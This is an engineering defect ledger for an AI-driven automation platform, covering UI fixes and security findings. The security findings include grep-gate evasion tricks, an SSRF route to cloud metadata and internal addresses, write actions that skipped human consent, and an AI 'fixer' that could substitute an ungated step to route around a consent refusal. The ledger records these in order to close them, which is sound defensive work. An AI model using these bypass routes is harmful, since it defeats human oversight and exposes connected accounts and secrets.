  rehearsal activity bar rendered the fixer commentary one-word-per-line: `Headline`/`Subline`/
  `ResolutionLine` sat as siblings in the flex-row `BarWrapper`, so a long failure message squeezed
  the headline to content-width. Fixed by wrapping the text block in a `min-w-0 flex-1` column in
  the `fixing-step` and `running-step` branches (`web/components/automations/run-activity-bar.tsx`).
  Evidence: walkthrough `stabilization-verification/2026-07-11_11-26-17` (pre-fix state on camera).
- **`chat-turn-no-progress-indicator`** (vision-discovered, walkthrough 2026-07-11) - plain chat
  turns showed NO indicator between send and the first streamed chunk (the whole knowledge-search
  phase was a blank screen): the progress indicator required `sessionJob`, which only build
  sessions have. Fixed: `isExecuting && (sessionJob || !isBuildSession)`
  (`web/components/builder/chat-panel.tsx`), so chat turns show "A pensar..." + elapsed time
  immediately. Evidence: walkthrough `2026-07-11_11-44-28` (blank) vs `2026-07-11_11-49-20` (fixed).
- **`automation-step-events-thin`** (operator-reported, 2026-07-11) - a regression vs old cortex: the
  automation run's `step` SSE event dropped everything but `{runId, stepIndex, status}`, so per-step
  screenshots captured + persisted server-side (`writeStepScreenshot`) never reached the run viewer,
  and there was NO `express.static('/automation-screenshots', ...)` mount - even the already-emitted
  `pause_for_user` screenshot URL 404'd. Fixed by (a) extending the shared `AutomationRunEvent.step`
  member + `RunRecord` with the optional enrichment (`stepId/tier/error/errorDetails/screenshotUrl/
  output/durationMs`; `errorDetails` is the executor's already-redacted+bounded integration/api
  request-response that lights up the live IntegrationErrorPanel; per-step `RunStepRecord` with a
  served `screenshotUrl`), (b) a pure, unit-tested
  mapper `automationStepEventPayload` (api/src/automation/run-events.ts) the composition-root emitter
  now forwards, (c) mounting `/automation-screenshots` on `automationRunsRoot()` mirroring the
  `/artifact-screenshots` precedent, and (d) serializing steps (with `screenshotUrl`) in `toWireRun`
  so `GET /runs/:id` + the Histórico drill-in render thumbnails without knowing the disk layout. The
  disk-path -> served-URL map lives in ONE helper (`screenshotUrlFromPath`). Covered by
  `api/tests/automation/run-events.test.ts`, `api/tests/contract/automation-screenshots.test.ts`, and
  shared `contract.test.ts` (thin+enriched parse). Decision logged in `docs/decisions.md`. Remaining
  for live verification: a real automation run driven end-to-end (operator session).
- **`automation-vision-empty-screenshot`** (operator-reported, 2026-07-11) - a browser/verify step
  could hand the vision tier an EMPTY screenshot (a `page.screenshot()` that failed on the local
  session, or a daemon observation envelope missing `screenshotB64`); the model then answered
  `confidence:'low'` and the engine refused ("No screenshot was provided"), burning the fixer budget
  blind and crippling self-recovery. Fixed with a guard (`screenshotForVision` in engine.ts): on an
  empty capture, force ONE fresh `observe()` and re-read; if still empty, fail the step RECOVERABLE
  with a user-grade PT message ("captura de ecrã indisponível - o passo não pode ser resolvido
  visualmente") so the fixer/pause machinery handles it - the model is never asked to work blind.
  Belt-and-braces: `LocalBrowserSession.capture()` now retries the screenshot once after a settle and
  only keeps a NON-EMPTY capture; `resolvePlaywrightAction`/`verifyOutcome` throw on an empty image
  (documents the invariant). Covered by two `api/tests/automation/engine.test.ts` cases (browser +
  verify: no blind vision call, recoverable PT failure). LIVE-VERIFIED 2026-07-11 (DRE-search
  automation): per-step screenshots stream into the run viewer AND the Histórico drill-in; step
  screenshots serve 200 at `/automation-screenshots/<automationId>/<runId>/step-N.png`; the run
  completed with no blind-refusal. One more display fix made during that run: the verify-failure
  prefix was still English (`outcome not met:`) - now PT (`resultado não atingido:`) in
  `engine.ts` (the one test asserting the prefix updated).
- **`automation-run-surfaces-word-wrap`** (operator-reported, 2026-07-11) - extends
  `run-activity-bar-word-wrap` to the terminal states + the run viewer: the completed/failed activity
  bar and the run-viewer run-level + per-step error surfaces rendered long unformatted text that
  ballooned the layout. Fixed with `min-w-0 break-words` + `line-clamp` (2-3 lines, full text on
  `title`) on the completed/failed `Headline` detail (`run-activity-bar.tsx`) and the error blocks
  (`run-viewer.tsx`). Also: the vision resolver/verifier/fixer/classifier prompts now instruct the
  model to write human-facing free-text (reasoning, userInstructions) in pt-PT while keeping all JSON
  keys/enums in English.

- **`apps-embed-frame-headers`** - the `/apps/*` embed surface now answers CSP
  `frame-ancestors 'self'` + the configured dashboard origins (`EKOA_DASHBOARD_ORIGINS` csv ->
  `EKOA_APP_ORIGIN` -> dev localhost:3000; invalid entries dropped) with NO `X-Frame-Options`;
  the dashboard CSP gained `frame-src`/`img-src` for the api origin. The preview iframe renders
  live and is pinned by e2e. Other planes unchanged (API `'none'`+DENY, served `'self'`+SAMEORIGIN).
- **`registo-targetIds`** - `registoEntry.targetIds` emitted the metadata object where the schema
  wants `array(Id)`, failing `RegistoListResponse` validation; now derives ids from id-keyed metadata.
  Verified live.
- **`/users` + `/usage` crashes** - undefined `.toLocaleString()`; `adminListUsage` now left-joins
  users and emits the full gauge surface, `fmtTokens` on totals.
- **integrations page crash** - the session stub now answers `sessionConnect` + `actions`
  (`SessionCaptureStatus` carries both).
- **artifact versions 500** - `readVersions` graceful dual-jail for never-built artifacts and the
  featured list. (Featured-artifact `restoreVersion` remains open - see `restoreVersion-featured-500`.)
- **`knowledge.listUploads`** `_id`->`id`; **`ekoaLocal.llmModels`** `{data}` envelope; **servedApp**
  `appDataList`/`appSharedList` envelope - contract fold-ins.
- **artifact thumbnails** - previously unimplemented; now end-to-end (build-mechanics screenshot seam,
  `/artifact-screenshots` static mount, `Artifact.screenshotUrl`, dev CSP `img-src`).
- **automations planner failures** - TRUE ROOT CAUSE: the SDK option was `customSystemPrompt`, ignored
  by Agent SDK 0.2.118 (the option is `systemPrompt`), so EVERY system prompt was silently dropped on
  the live path - the planner never saw the required JSON shape. Fixed, plus `runOneShot` `maxTurns`
  1->3 for thinking-heavy EXPERT one-shots, plus a distinct `plan_unavailable` wire status for egress
  outages (never "reformule o objetivo" for a dead transport).
- **brand research not persisting** - the agent now emits a structured `BrandResearchResult` that is
  merge-written onto `org.branding`.
- **gateway always-FAST clamp** - amended: a request whose model matches one of the three configured
  tier models now runs AND meters at that tier (EXPERT ~20x FAST cost - deliberate); other models keep
  the FAST clamp. This un-starved the strict-JSON EXPERT planner and thinking-heavy builds.
- **`<ekoa-context>` reinjection** - the persisted context block was never re-injected on the next
  turn; now re-injected (`agents/context.ts`).
- **thinking channel** (2026-07-10) - intermediate commentary self-identifying as the engine briefly
  flashed unredacted; now a first-class `thinking_chunk` channel, server-side branding-redacted, and
  `result.text` is answer-only (which also fixed the persisted-answer contamination).

## Previously fixed - rc-1 release hardening + batch-final (2026-07-08..10)

All fixed-verified with committed tests: **F1** (auth lifecycle - refresh/logout/password/device +
jti revoke), **F2** (credential provisioning + live turn), **F3** (Registo CRUD/login/build write
coverage, metadata-only, org-scoped), **F4** (branding research + `PUT /branding` alias), **F5**
(UI-called endpoints mounted + mount-coverage drift gate), **F6** (terminal JSON-envelope 404),
**F7** (honest failed-build serving state + `Job.error`), **F10** (per-org deny-list resolver wired +
org-admin CRUD + live masking proof), **F11** (session rename `name`/`title` + `createdAt`/`updatedAt`),
**F13** (stale `credentials.ts` header), **F16/F28** (build served the untouched scaffold and verify
passed it - `BUILD_UNFULFILLED`/`VERIFY_FAILED` terminals + live J3 re-proof), **F20** (chat result
truncation - persisted == concatenated chunks), **F21** (memory recall injection wired + backfilled
test), **F22** (`memoryView` omitted `orgId`/`tags` - `/memory` rendered 0 cards), **F23** (7 console
errors on `/memory`), **F25** (host-context bleed - mechanism reproduced, hardened, accepted residual
documented), **F26** (de-anon round-trip broken by model whitespace reformatting - format-tolerant
detokenizer + 13k-case security property), **F29** (automation plan-from-goal 500 -> structured
`plan_failed` 200). **F19** was a verified billing PASS (no fix).

## Accepted / by-design / won't-fix

- **collections-engine access rules defined-not-enforced** (tracked `docs/decisions.md` 2026-07-07).
  The per-collection `access`/`declaredOnly`/field/size rules are defined in
  `data/collections-engine.ts` but not threaded end-to-end: no producer (app manifest) declares
  `collections`, so the plane runs at the safe default (schemaless, 256 KiB, app-scope). Not
  exploitable. Close both halves together when a producer lands: wire the manifest's `collections`
  block onto `artifact.collections` AND thread the resolved rule into the engine + gate `access`
  levels in `served-data.ts`.
- **served-app per-app data plane open posture** (by-design). `/api/app-data` is unauthenticated app-
  global storage scoped only by `X-Ekoa-App-Id`, carried verbatim for byte-compatibility; private data
  belongs on the server-authenticated shared/JWT/SSO planes. Documented in `docs/security.md`.
- **`docx-clean-drops-comments`** (accepted, kept deliberately; found by the 2C-S7 docx gate,
  2026-07-25). `POST /api/app-docx/clean` (`document-source.getClean` ->
  `docx-redline.acceptAllRevisions`) returns a document with NO comments: @adeu/core 1.28.0's
  `accept_all_revisions` strips `word/comments.xml`, `commentsExtended.xml`, `commentsIds.xml`,
  `commentsExtensible.xml` AND the in-document `commentRangeStart/End/Reference` anchors. **Word
  itself keeps comments when you accept all changes**, and ekoa-dev's `word-track-changes.md`
  asserted comments survive - that claim was never tested (dev's `acceptAllRevisions` is
  byte-identical to ours and its test only checked for the absence of `w:ins`/`w:del`), so the port
  inherited a false doc, not a regression. KEPT rather than worked around: the clean copy is the
  "final version to send out", and shipping internal review notes to a counterparty is a real legal
  risk. The WORKING copy (`GET /api/app-docx/current`) is unaffected and carries everything. Pinned
  as a tripwire in `api/tests/apps/docx-word-gate.test.ts` (a future engine bump or a deliberate fix
  turns it red, so the lawyer-facing download can never change silently) and documented in
  `docs/word-track-changes.md` §2.4 + the `getClean` header.
- **subprocess PATH home-path residual** (by-design). The agent subprocess inherits the operator's
  home on `PATH`; accepted residual from the F25 hardening (disposition doc committed).
- **`sweepOrphans` boot-recovery gap** (accepted). Boot-time crash recovery flips orphaned jobs to
  `failed{ORPHANED}` without a Registo row; guaranteed-once holds on the normal live path.
- **F9** (won't-fix-minor). Trigger disable (410) is unreachable over the API (delete-only lifecycle).
- **F24** (won't-fix-minor). Extraction can persist a markdown-only junk memory (`**`).
- **F27** (won't-fix-minor). `GET /registo?type=anonymisation` returns 0 rows - filter-granularity
  confusion (the qualified query returns all rows); not a missing row.
- **F30** (won't-fix-minor). Builds do not emit a `memory-extract` billing row (build post-run
  extraction differs from the chat path).
- **served-app assistant "Fontes" can contradict the reply** (open; found by D2 fresh review, 2026-07-13; CONFIRMED harder by D3 live evidence: 5 authoritative-looking Acórdão citations rendered directly under an explicit "não posso responder" refusal — slices/D3 live-04-fontes.png of run 20260712-150958-4bb23640).
  `runAppAssistant` returns ALL grounding hits as citations (`api/src/apps/app-assistant.ts`
  `grounding.citations`), not the sources the model actually used - the live D2 evidence shows a
  reply saying the excerpts were not used while five "Fontes" render under it. Trust-eroding for a
  cite-your-source legal product. Candidate fix: emit only reply-referenced citations, or suppress
  the list when the model states it grounded on nothing. Owner: D3/F-slice follow-up on the
  operator-run branch (or platform, whichever lands first).
- **served-app anonymous `whoami` logs a console 401** (open platform nit, surfaced by the D2 strict
  console gate, 2026-07-13). `injected-context.ts:110` fetches `/api/app-sso/me`; for an anonymous
  visitor it 401s and the browser logs the failed resource on EVERY served app load. Candidate fix:
  200 `{user:null}` for anonymous (contract response is `z.unknown()`, additive). Until fixed, the
  D2 e2e allowlists exactly this signature (documented in `api/tests/e2e/assistant-panel.e2e.mjs`).
- **served-app health beacon 502 through the dev proxy** (open platform nit, surfaced by the D2
  strict console gate, 2026-07-13). `injected-context.ts:244` POSTs `/api/app-health`; through the
  dev proxy (:4111) it 502s and logs a console error on load. Likely a dev-proxy forwarding gap
  (relates to d55bd02). Prod path unverified. Allowlisted (documented) in the D2 e2e only.

## F-2026-07-18-invalid-date-cards (open, cosmetic)
Artifact cards on /artifacts render "Invalid Date" for dev-seeded artifacts whose createdAt is
empty (visible in the OS-mode walkthrough, classic beats). Real user-created artifacts carry
timestamps; the fix is either seeding createdAt in the dev fixtures or formatDate falling back
to a dash for missing dates. Surfaced by the walkthrough vision pass; needs a deterministic
close (unit on formatDate fallback) or a written dismissal.

## F-2026-08-03-chokepoint-gate-bypasses (FIXED)

The chokepoint grep gate (`scripts/chokepoint-grep.sh`, `npm run gate:chokepoint`, in CI) was
bypassable four ways after the widening recorded above. A fresh-context verifier reproduced each by
running the real script; each was re-reproduced before the fix and re-run after. All four are closed
and pinned by `api/tests/security/grep-gates.test.ts`, which executes the REAL script against
planted violations. Revert-verified: five scripted reversions, each turning the matching case red.

- **`chokepoint-marker-smuggled-into-a-path`** (FIXED 2026-08-03, CRITICAL, gate bypass). The
  allow-marker was filtered with `grep -v 'chokepoint-gate-allow'` over the whole
  `path:line:content` output line, so the marker matched in the PATH as well as the content:
  `api/tests/chokepoint-gate-allow/p.ts` (a DIRECTORY) or `api/tests/x/chokepoint-gate-allow.ts` (a
  FILE) exempted itself, and a directory exempted an unbounded subtree. That defeated both
  properties the marker was introduced with: exemption is one LINE, and `grep -rn` over content
  enumerates every exemption. FIXED: an awk filter splits `path:line:content` and matches the marker
  against the CONTENT ONLY (path exemptions are matched against the PATH field, anchored). Pinned by
  "the allow-marker cannot be smuggled into a DIRECTORY name" / "... into a FILE name".

- **`chokepoint-gate-was-case-sensitive`** (FIXED 2026-08-03, CRITICAL, gate bypass). The needle had
  no `-i` while the script's own comment claimed "case-insensitive", so
  `https://api.Anthropic.com/v1/messages` passed the gate. DNS is case-insensitive, so that URL
  resolves and works: exactly the raw-fetch class the gate exists to catch. `'@ANTHROPIC-ai/sdk'`
  and `'ANTHROPIC.COM'` passed too. Worse, the two exemption filters used `-iv`, so the
  case-insensitivity was on the WRONG side of the fence: `api/src/LLM/` and `api/tests/LLM/`
  inherited the chokepoint module's exemption. FIXED by splitting the gate into the two passes its
  comment always claimed: PASS 1 matches the banned references themselves (`@anthropic-ai`,
  `anthropic.com`) CASE-INSENSITIVELY over every root; PASS 2 is the broad lowercase `anthropic`
  token as a split-string net. The path exemptions are now case-SENSITIVE and anchored. Pinned by
  "an UPPER-CASE provider host fails", "an UPPER-CASE package scope and a bare upper-case host both
  fail", and "the PATH exemptions are case-SENSITIVE".

  KNOWN RESIDUAL, accepted deliberately: pass 2 stays case-SENSITIVE. The word legitimately appears
  ~40 times outside `api/src/llm/` in two shapes that are not egress and cannot be removed - the
  capitalised proper noun in doc comments and UI copy ("Anthropic-compatible clients", including
  `shared/`, `server.ts` and the locales), and the SCREAMING_SNAKE env identifiers
  `ANTHROPIC_BASE_URL` / `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY`, of which `ANTHROPIC_BASE_URL`
  is the mechanism CLAUDE.md MANDATES for pointing a subprocess AT the chokepoint. A case-insensitive
  pass 2 would mean ~40 line markers, turning the marker into furniture and destroying the property
  that `grep -rn chokepoint-gate-allow` is a short readable enumeration. The cost is that a literal
  that is BOTH split AND mixed-case (`'api.' + 'Anthropic' + '.com'`) evades both passes; so does
  charcode obfuscation, which no grep gate can see. The ESLint import ban and review are the other
  layers. Pinned in the other direction too ("the sanctioned wiring identifier and prose do NOT trip
  it"), so a future widening has to confront the trade-off rather than discover it.

- **`chokepoint-gate-scanned-a-root-that-does-not-exist`** (FIXED 2026-08-03, HIGH, gate coverage).
  The script scanned `web/src`, WHICH IS NOT A DIRECTORY (the real roots are `web/app`, `web/lib`,
  `web/components`, `web/stores`, `web/hooks`, `web/locales`, `web/types`, plus `web/e2e`,
  `web/__tests__`, `web/scripts`), while the comment the previous commit wrote claimed "so a raw
  provider reference cannot hide in the frontend". Probes planted in `web/lib/` and `web/app/` both
  passed. `scripts/`, `api/scripts`, `api/assets` (first-party served runtime bundles) and
  `clients/` (a SHIPPED CLI workspace) were unscanned too. FIXED: the root list is now every
  first-party source root, and - the actual root cause - A DECLARED ROOT THAT IS NOT A DIRECTORY NOW
  FAILS THE GATE. A missing root used to be scanned as empty, i.e. reported clean; that is how
  `web/src` hid the whole frontend for as long as it did. Widening surfaced 5 new hits, all in web
  and all triaged as anti-leak enforcement (the token is the needle of a check that the name is
  ABSENT): `web/lib/sanitize-error.ts` (the provider-leak denylist), `web/e2e/chat-thinking.spec.ts`
  (x2), `web/__tests__/sanitize-error.test.ts`, `web/__tests__/components/thinking-block.test.tsx`.
  Each got a same-line marker; no real violation was found and nothing was weakened to make it pass.
  Pinned by "EVERY declared root is really scanned" (one probe per root), "a violation in the
  FRONTEND, in scripts/ and in the shipped clients/ CLI fails on the real tree", "a DECLARED ROOT
  THAT DOES NOT EXIST fails the gate" and "every declared root really exists in the repo".

- **`ekoa-llm-direct-really-does-bypass-the-chokepoint`** (RECORDED 2026-08-03, MEDIUM, honest
  labelling - NOT a shipped bypass, behaviour deliberately unchanged). `api/tests/journeys/boot-b.mjs`
  justified its allow-marker by claiming `LLM_CHOKEPOINT_BASE_URL` is "the CHOKEPOINT'S OWN
  destination ... never a route around it". That is FALSE, and the finding above repeats it.
  `api/src/config.ts:297` feeds the variable to `llm/credentials.ts:isLocalGatewayChokepoint()`,
  which is true ONLY for a loopback host; pointed at the provider it is false, so
  `buildSubprocessEnv` (`llm/credentials.ts:387,395`) stops injecting the boot-provisioned GATEWAY
  key and injects the REAL MODEL CREDENTIAL (`CLAUDE_CODE_OAUTH_TOKEN` / `ANTHROPIC_API_KEY` = the
  secret), and sets the subprocess's `ANTHROPIC_BASE_URL` to the provider. `EKOA_LLM_DIRECT=1`
  therefore spawns SDK subprocesses pointed straight at the provider carrying the model secret: no
  gateway, no anonymisation pipeline, no attribution or metering - verbatim what CLAUDE.md's
  egress-chokepoint rule forbids. It is NOT a shipped bypass: opt-in, default off, in a dev journey
  harness product code never imports, set by no CI lane (`grep -rn EKOA_LLM_DIRECT`), and its one
  use is watching live token streaming that the gateway path buffers by design. Its BEHAVIOUR is
  deliberately unchanged; what changed is that the comment now says what it does, at both marker
  sites, and it is recorded here so it is discoverable rather than buried in a marker. If the dev
  need for live streaming is ever solved on the gateway path, delete the flag.

## F-2026-08-03-ungated-write-rails (C2 follow-up; ALL FIVE FIXED)

The C2 fresh-context reviewer confirmed the Action write gate is solid on the rail it covers, then
enumerated five more surfaces that reach the same effect with no gate at all. Four were closed in
the C2 slice itself; the fifth
(`consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`) was closed the next
day, 2026-08-04, by keying the approval on the RESOLVED destination.

**HEADING CORRECTED 2026-08-20** (slice S1). This heading read "four FIXED, one OPEN", and the
paragraph under it said the fifth "is recorded OPEN because the complete fix belongs in a file this
slice does not own", for sixteen days after that fifth entry was fixed - while the entry itself,
forty lines below, has said **FIXED 2026-08-04** the whole time. The ledger was advertising an open
consent-integrity defect one heading above the text proving it closed.

Re-verified in code before this edit rather than taken from the entry's own word:
`actionTarget(action, resolution)` renders the RESOLVED destination and
`idFor(scope, key, actionName, shape, decision, target)` keys the approval on it
(`api/src/integrations/action-consent.ts`), so BOTH halves are shut - the placeholder the dialog
used to show, and the config edit that could move the destination under a live approval. Suite:
`api/tests/security/consent-destination-binding.test.ts`.

Recorded rather than quietly corrected, because a stale heading is exactly how a closed finding gets
"fixed" a second time: slice S1 was briefed to close these two halves as open work, and would have
re-implemented a live control had it trusted this heading over the code.

- **`platform-actions-were-completely-ungated`** (FIXED 2026-08-03, CRITICAL, unapproved writes on
  the org's managed OAuth connection). `google-workspace` / `microsoft-365` short-circuit to
  `callPlatformIntegration`, from `automation/engine.ts` (the `integration` step), the artifact
  `integration.call` primitive, the listener supervisor's poll, chat prefetch and email hydration.
  None of those paths consulted any approval, so RUN_SPEC criterion 6 - "a write requires human
  confirmation" - was simply FALSE for the mailbox, calendar, Drive and OneDrive of every connected
  org: 14 mutating Google actions (`send_email`, `send_email_simple`, `create_event`,
  `update_event`, `delete_event`, `create_doc`, `write_doc`, `create_sheet`, `append_sheet`,
  `modify_email`, `batch_modify_emails`, `trash_email`, `create_task`, `complete_task`) and 3
  Microsoft ones (`send_email`, `create_event`, `create_file`), executable with zero confirmation by
  any org member who could drive an automation or an artifact. FIXED by enforcing C2's
  `checkActionConsent` inside `callPlatformIntegration` itself, keyed on a build-time allowlist of
  READ actions that must AGREE with the definition's `mutates` (decisions.md 2026-08-03), before any
  OAuth token is read. Pinned by `api/tests/security/platform-write-gate.test.ts` (19 cases:
  allowlist-vs-shipped-package drift in both directions, fail-closed on unknown key/action/`mutates`,
  refusal with no provider call, cross-org / cross-user / cross-action / TTL non-transferability,
  reads still auto-running) and `api/tests/automation/platform-primitive-write-gate.test.ts` (the
  artifact rail through the real seam body, plus the composition-root wiring guards).

- **`api-call-steps-were-a-fifth-write-rail`** (FIXED 2026-08-03, HIGH, gate bypass by step type).
  `automation/executors/api-call.ts` performed any HTTP method with `authIntegrationKey` credentials
  injected and no consent check, so an agent refused at the Action gate could author the same write
  as a step one type over. FIXED: a non-idempotent method (anything outside `GET`/`HEAD`/`OPTIONS`,
  and an absent/unrecognised method) now needs a human, checked BEFORE the credential load so an
  unapproved write never decrypts a secret, through the automation tier's existing consent module
  (decisions.md 2026-08-03 for why not C2's store). Pinned by
  `api/tests/security/api-call-write-gate.test.ts` (12 cases incl. "no credential read on refusal",
  shape drift on url/body/header/method/credential/bodyKind, cross-user, cross-org, once-vs-always).
  BEHAVIOUR CHANGE, deliberate: an existing automation with a POST/PUT/PATCH/DELETE `api_call` step
  now asks once per shape - dialog on an attended run, refusal on an unattended one - instead of
  running silently.

- **`awaiting-consent-was-not-a-pause-and-the-fixer-could-rewrite-around-it`** (FIXED 2026-08-03,
  HIGH). `engine.ts` paused only on `recoverable === false`, and the consent refusal's message does
  not match `/not connected/i`, so an unapproved write ended the run as `failed` (a state a caller
  retries) rather than as something a human is asked to answer. On the step types the fixer does
  handle it was worse: `rehearsal.ts` let `replace_current` substitute an arbitrary `Step`,
  INCLUDING an `api_call` performing the same write with no gate - the machinery meant to repair a
  run could route around the gate that stopped it. FIXED in three places: both integration rails now
  carry the executor's CODE on `details` (the composition root's platform binding previously dropped
  it) and the engine classes the refusal structurally, not by prose; both refusals are
  non-recoverable so `shouldAttemptFix` never invites the fixer; and the fixer's step vocabulary is
  narrowed to the four types `FIXER_SYSTEM` actually documents. Pinned by the write-rail block in
  `api/tests/automation/engine.test.ts` and the vocabulary block in
  `api/tests/automation/rehearsal.test.ts` (incl. "an effect payload cannot ride along on an
  accepted step type").

- **`builder-test-endpoint-was-an-unguarded-egress`** (FIXED 2026-08-03, HIGH, SSRF). 
  `POST /api/v1/integration-builder/test` ran a model-authored `httpConfig` on a BARE `fetch` while
  its own docblock claimed it matched the action executor's `guardedFetch` posture. Any
  authenticated user could point it at `http://169.254.169.254/`, loopback, or any RFC1918 address
  the API host can reach. FIXED with `guardedFetch` + the no-echo refusal, no transport seam and no
  environment exemption. Pinned by `api/tests/security/builder-test-ssrf.test.ts` (8 cases against
  the route's real default). The WRITE-GATE half was deliberately not applied - see decisions.md
  2026-08-03 for the argument (synchronous human caller, own session, caller-supplied credentials,
  nothing stored spent; and gating an unsaved session package would be a ban, not a gate).

- **`consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`**
  (**FIXED 2026-08-04**, was MEDIUM, consent integrity - found by a live vision-driven run against a
  REAL third-party integration, not by a suite). Two halves of one problem, both reproduced end to
  end on the running stack with a real ntfy.sh account and a real gateway key.
  CLOSED by keying an approval on (org, user, integration, action, SHAPE, **DESTINATION**), where
  the destination is the RESOLVED target. It resolves from `publicConfigValues` - a plaintext
  projection of the values the definition's `configSchema` does NOT mark secret - so the gate still
  answers BEFORE any credential is decrypted and C2's ordering is intact; a secret in a destination
  renders as `••••` and is never resolved into a dialog. Deliberately NOT a hash of the credential
  blob: the envelope is non-deterministic, so that would make every routine OAuth refresh revoke
  every standing approval. `actionShape` is untouched, so D3's authoring/trust fingerprint keeps its
  meaning. Suite: `api/tests/security/consent-destination-binding.test.ts` (7 cases; removing the
  destination from the approval key was reverted-and-verified to turn the redirect case red).
  RE-VALIDATED LIVE after the fix: the dialog now shows
  `VAI EXECUTAR POST https://ntfy.sh/<real topic>`, moving the topic returns 403 `awaiting_consent`
  with the re-prompt naming the NEW destination and nothing published, and restoring the approved
  destination works again without re-approving.
  (a) THE DIALOG SHOWS A PLACEHOLDER. `actionTarget()` renders `httpConfig.baseUrl + path`
  VERBATIM, so for any action whose path is templated the human is asked to authorise
  `VAI EXECUTAR POST https://ntfy.sh/{{ntfy_topic}}`. C2's requirement is that the dialog names the
  real destination "not a paraphrase"; a raw placeholder is strictly less than a paraphrase. The
  shipped Slack package hides this because its baseUrl and path are both literal.
  (b) AND THE DESTINATION CAN MOVE UNDER A LIVE APPROVAL. `actionShape` fingerprints
  `(key, actionName, backing, transport, httpConfig, automationBinding)` - the TEMPLATE. Config
  VALUES are not in it. Reproduced: a human granted "Autorizar sempre" for the write; the config's
  `ntfy_topic` was then changed with `PATCH /api/v1/integrations/configs/ntfy` and NOTHING else;
  the same gateway key's next `achieve` call published to the NEW topic, HTTP 200, message
  confirmed landed on a destination the approver never saw. No re-prompt, because by the
  fingerprint nothing changed.
  SCOPE, honestly: the host cannot be moved this way - `baseUrl` is literal in the action and
  origin-binding would refuse a new host - so this redirects WITHIN an already-bound origin
  (path/query/body). And the principal who can edit the config is the credential owner, so this is
  not a peer-to-peer escalation. What it does break is the meaning of the consent record: "I
  authorised sending to X" silently becomes "sending to Y", which is exactly what the approval
  exists to pin. It also matters more after D3, since `achieve` makes the write rail reachable by a
  key whose holder is not the approver.
  CANDIDATE CLOSES (not attempted here): render the RESOLVED target in the dialog for non-secret
  config values and mark secret ones, or extend the fingerprint to cover the config values the
  template actually names, so moving one invalidates the approval the way editing the action does.
- **`authored-action-guardrails-cannot-prove-an-endpoint-exists`** (OPEN 2026-08-04, LOW, honest
  labelling - observed while validating D3's author arm against a REAL API with a real model).
  `achieve` was asked for "consultar as estatisticas do topico" on a live ntfy.sh integration. It
  authored `consultar_estatisticas_topico` -> `GET https://ntfy.sh/<topic>/stats`, and ALL EIGHT
  deterministic guardrails passed: shape, action_name, backing, transport, origin, placeholders,
  no_pasted_secret, render. The action was well-formed, on a bound host, naming only declared
  variables. It is also wrong: ntfy has no `/stats` endpoint, and once a human promoted it the call
  returned a real 404.
  NOT A DEFECT IN THE SUITE, and recorded so nobody reads a passing verification as more than it
  claims: every check is a property of the DRAFT, and none of them can know a remote API's route
  table without calling it - which the author arm must not do, since the call it would make is
  exactly the unapproved one. This is the argument FOR provisional-by-default rather than against
  it: the state machine exists because a draft can be perfectly formed and still not work, and the
  human promoting it is the first party in a position to notice.
  CANDIDATE CLOSE if it ever matters: surface the verification verdict in the promotion dialog
  alongside a one-click dry run of the drafted action, so the person promoting sees the real
  response before they take responsibility for it.
- **`action-shape-does-not-cover-browser-steps-content`** (OPEN 2026-08-03, HIGH, consent bound to a
  name rather than to a command). `actionShape` (integrations/action-consent.ts) hashes
  `automationBinding` - i.e. the automation's ID - and never the STEPS that automation runs.
  `provisionIntegrationAutomations` re-provisions the SAME deterministic org-scoped id from a
  refreshed template and rewrites `steps` in place, so a package bump changes WHAT EXECUTES while
  the human's approval still stands. That is exactly the "consent never approved the command called
  deploy" failure the module's own docblock invokes: it holds for `httpConfig`, and not for the
  automation backing. `bash-cli` is saved by the engine's separate `approved_commands` gate and, as
  of this slice, an `api_call` step inside a provisioned automation is gated too - so the residual is
  a swapped `browser`/`navigate`/`verify` sequence, which is precisely what a `browser-steps` action
  is made of. NOT FIXED HERE because the fix belongs in `action-consent.ts`, C2's file and read-only
  for this slice. THE FIX, precisely: make the bound automation's CONTENT part of the fingerprint -
  either hash the provisioned automation's canonical `steps` into `actionShape`'s tuple alongside
  `automationBinding` (needs the steps at gate time, i.e. a resolver the executor can call), or have
  the provisioner stamp a content digest onto `automationBinding` (`actionShape` already hashes the
  whole binding object, so the shape would follow with no change to the hash function at all). The
  second is additive and cheaper; both make a package bump re-prompt, which is the correct direction.

- **`no-wire-event-can-carry-a-pause-reason`** (OPEN 2026-08-03, LOW, honest labelling). A run that
  halts because an integration WRITE needs approval persists `status: 'awaiting_consent'` (correct,
  and what the run resource and Histórico show), but has no truthful terminal SSE frame: `paused`
  carries only `{ service }` (`shared/src/events.ts`) and the dashboard maps it to
  `awaiting_integration`, i.e. it would tell someone whose integration is connected and working to go
  connect it; `awaiting_consent` carries `{ stepIndex, shape, argv, description }`, a COMMAND
  consent whose "sempre" the dashboard answers into a store this gate does not read. The engine
  therefore emits `error` with the message that names the action, the destination and the fact that
  an approval is needed - true and actionable, at the cost of a live badge that reads "failed" while
  the record reads `awaiting_consent`. THE FIX: `paused` gains an optional `reason` (additive under
  Rule 7), the dashboard renders `awaiting_consent` distinctly and links to the integration's
  action-approvals surface. Not done here: `shared/` is slice D1's live surface this wave.

- **`module-level-regex-from-an-imported-const-silently-misbuilds-in-the-integrations-cycle`**
  (OPEN 2026-08-03, HIGH latent, correctness - found by slice E2 while building `publish-scrub.ts`).
  `api/src/integrations/` contains a live import cycle: `definitions -> service -> credential-cofre
  -> definition-registry -> publish-scrub -> definitions`. Inside a cycle, a module-level
  `new RegExp(SOME_IMPORTED_CONST)` evaluates while the imported binding is still in its temporal
  dead zone / undefined, so the pattern is built from the WRONG source and compiles silently. E2 hit
  this for real: the placeholder branch of its credential pattern never matched, which made the
  publish floor redact EVERY SHIPPED AUTH HEADER — i.e. published integrations would have gone out
  with `[REDACTED]` where their `Authorization` template belonged. It failed silently at every level
  except one: the shipped-package identity property test (the A3 determinism ratchet) was the only
  thing that caught it. Fixed in E2 by building the regex LAZILY. THE FINDING IS NOT E2's BUG - it is
  that the hazard is invisible and repeatable: any future module-level use of an imported binding
  anywhere in that cycle can misbuild the same way. Close by breaking the cycle, or by a lint rule
  banning module-level `new RegExp(<imported>)` in `api/src/integrations/**`. Logged by the
  orchestrator because E2 correctly reported it rather than editing a file outside its ownership.

- **`send-to-pairing-returning-true-is-not-delivery`** (OPEN 2026-08-07, MEDIUM, honest signalling
  - found while verifying the attended ceremony live against a MacBook Air over a DERP relay).
